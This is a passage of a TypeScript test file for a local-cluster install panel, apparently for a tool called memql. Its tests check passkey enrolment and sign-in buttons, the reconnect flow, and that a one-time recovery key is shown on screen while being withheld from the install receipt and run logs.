      "and offer it as the PRIMARY action: the account already exists and holds no " +
        "credential, whereas the magic-link route waits on a mailbox a local cluster " +
        "does not have",
    );
    assert.match(
      html,
      /class="secondary" type="button" data-act="signInAsOwner"/,
      "which demotes the magic link to the fallback it now is",
    );
  } finally {
    h.close();
  }
});

// The link carries a plaintext single-use bearer in its query string. Since
// memql#3906 the panel does not hold one at all -- it is minted at click time
// and handed straight to the opener -- so this asserts the property is intact
// end to end rather than that one field is guarded.
test("no enrolment credential reaches the webview, or the panel", async () => {
  const h = await runToDoneWithOwner();
  try {
    const html = h.html();
    // Asserted FIRST so this cannot pass vacuously. "the token is absent" is
    // trivially true of a screen that rendered no enrolment at all, which is
    // exactly the state this test would otherwise keep passing against.
    assert.match(
      html,
      /data-act="enrolPasskey"/,
      "the enrolment must actually be on screen for its containment to mean anything",
    );
    assert.ok(
      !html.includes("mql_enr_"),
      "no enrolment bearer may be rendered into the page, in any form",
    );
    assert.ok(
      !/href=/.test(html.slice(html.indexOf('data-act="enrolPasskey"') - 200)),
      "the button carries no href: the host opens the URL, the page never sees one",
    );
  } finally {
    h.close();
  }
});

// An install whose enrolment step never ran, or ran against a cluster with no
// account to enrol (`ownerClaimed=false`), is not a broken install. It just has
// no button, and the magic link goes back to primary.
test("no owner account means no button, and the magic link is primary again", async () => {
  const runner = await fakeRunner();
  const h = open({ runner });
  try {
    beginInstall(h);
    await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");

    const html = h.html();
    assert.ok(
      !/data-act="enrolPasskey"/.test(html),
      "offering an enrolment button with no link behind it would open nothing",
    );
    assert.match(
      html,
      /class="primary" type="button" data-act="signInAsOwner"/,
      "with no passkey to offer, signing in is the primary route again",
    );
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// Reconnect: back in the list with nothing typed (memql#3741)
// -----------------------------------------------------------------------------

test("the reconnect card registers the cluster and never shows a form", async () => {
  const h = open({
    verdict: "installed-healthy",
    receipt: {
      version: 1,
      graph: "install",
      startedAt: "2026-08-01T00:00:00Z",
      updatedAt: "2026-08-01T00:00:00Z",
      entries: [
        {
          stepId: "seedBootstrap",
          script: "install/seed-bootstrap.sh",
          receipt: "",
          preExisting: false,
          params: { domain: "lab.example.com" },
          result: {},
          changed: true,
          recordedAt: "2026-08-01T00:00:00Z",
        },
      ],
    },
  });
  try {
    // WAIT FOR THE CARD, which is also the honest sequence: the verdict is
    // read asynchronously and the cards do not exist until it resolves, so an
    // operator cannot click this before then either -- and the panel refuses
    // the action until it can confirm the machine actually has a cluster.
    await until(() => h.html().includes("Connect to the local cluster"), "the reconnect card");
    h.post({ type: "choose", value: "reconnect" });
    await until(() => h.html().includes("Sign in as owner"), "the hand-off screen");

    // NOT ONE INPUT. The whole action is that the machine already knows the
    // answers, so a screen with a box on it would be the form it replaces.
    assert.doesNotMatch(h.html(), /<input/);
    assert.doesNotMatch(h.html(), /<select/);

    // And the entry it wrote is the install's own, at the receipt's domain.
    const written = fs.readFileSync(h.clustersPath, "utf8");
    assert.match(written, /name: lab/);
    assert.match(written, /endpoint: api\.lab\.example\.com:443/);
    assert.match(written, /local: true/);
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// The recovery key's one-time reveal (memql#4079)
// -----------------------------------------------------------------------------

const RECOVERY_KEY = `mql_rec_${"R".repeat(43)}`;

/** Runs an install whose recoveryKey step reports the given state (and key). */
async function runToDoneWithRecovery(state: string, key: string): Promise<Harness> {
  const runner = await fakeRunner(
    {},
    { "install.recoveryKey": { recoveryKey: key, recoveryKeyState: state } },
  );
  const h = open({ runner });
  beginInstall(h);
  await until(() => /Your cluster is ready|Finished/.test(h.html()), "the run to settle");
  return h;
}

test("the claimed recovery key is shown once, on the done screen", async () => {
  // THE DEFECT (memql#4079). The step's description promised "show it once";
  // memql#3908's withholding gate (tested) kept the value out of the run log
  // and the receipt, correctly; and no display surface was ever built. A
  // tested gate plus an untested promise equals a credential shown to no one
  // -- the CLI's terminal made the design complete there, so CI stayed green
  // while the plugin swallowed the envelope. This is the test the promise
  // never had.
  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
  try {
    const html = h.html();
    assert.match(html, /Your cluster is ready/, "the run should have reached the done screen");
    assert.ok(
      html.includes(RECOVERY_KEY),
      "the one-time reveal must reach the operator's eyes: the step claimed the key, " +
        "which ROTATED it, so a run that shows it nowhere has destroyed the old key and " +
        "revealed the new one to nobody",
    );
    assert.match(html, /shown once/i, "the block must say the value cannot be shown again");
    assert.match(
      html,
      /data-act="copyRecoveryKey"/,
      "a 47-character credential is copied, not retyped",
    );
  } finally {
    h.close();
  }
});

test("the reveal is DISPLAY, not storage: the receipt and the run log still withhold", async () => {
  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
  try {
    // Asserted FIRST so the containment half cannot pass vacuously against a
    // screen that revealed nothing at all.
    assert.ok(h.html().includes(RECOVERY_KEY), "the reveal must be on screen");

    // The receipt: written once, kept for the life of the install, read back by
    // repair and uninstall. memql#3908's gate must hold byte-for-byte.
    const receipt = fs.readFileSync(h.receiptFile, "utf8");
    assert.ok(
      !receipt.includes(RECOVERY_KEY),
      "the plaintext key must never reach the install receipt",
    );
    assert.ok(
      receipt.includes("[withheld: single-use credential]"),
      "the receipt still records THAT the step produced a credential",
    );

    // The run log: every file the recorder wrote for this run.
    const runsDir = path.join(path.dirname(h.receiptFile), "runs");
    // Dirents rather than names + statSync: the type comes back from the one
    // readdir call, so there is no second look-up on a path that could have
    // changed underneath it (CodeQL js/file-system-race).
    const runFiles = fs.readdirSync(runsDir, { recursive: true, withFileTypes: true });
    let sawWithheldKey = false;
    for (const dirent of runFiles) {
      if (!dirent.isFile()) continue;
      const file = path.join(dirent.parentPath, dirent.name);
      const content = fs.readFileSync(file, "utf8");
      assert.ok(
        !content.includes(RECOVERY_KEY),
        `the plaintext key must not reach ${path.relative(runsDir, file)}`,
      );
      if (content.includes("recoveryKey=[withheld: single-use credential]")) sawWithheldKey = true;
    }
    assert.ok(sawWithheldKey, "the run log still says the step produced a credential it withheld");
  } finally {
    h.close();
  }
});

test("a key claimed on an earlier run renders the fact, not an empty block", async () => {
  // What repair and upgrade find here: the credential exists, its owner holds
  // it, and it cannot be re-revealed -- only its hash was ever stored.
  const h = await runToDoneWithRecovery("alreadyClaimed", "");
  try {
    const html = h.html();
    assert.match(html, /Your cluster is ready/, "a re-run still hands off");
    assert.match(html, /Recovery key: claimed earlier/);
    assert.match(html, /rotate it from the portal/i);
    assert.ok(
      !html.includes('data-act="copyRecoveryKey"'),
      "there is no key here to copy; a copy button would copy nothing",
    );
  } finally {
    h.close();
  }
});

test("a cluster with no owner yet says when the key will exist", async () => {
  const h = await runToDoneWithRecovery("awaitingOwner", "");
  try {
    const html = h.html();
    assert.match(html, /Recovery key: minted after the first sign-in/);
    assert.ok(!html.includes('data-act="copyRecoveryKey"'));
  } finally {
    h.close();
  }
});
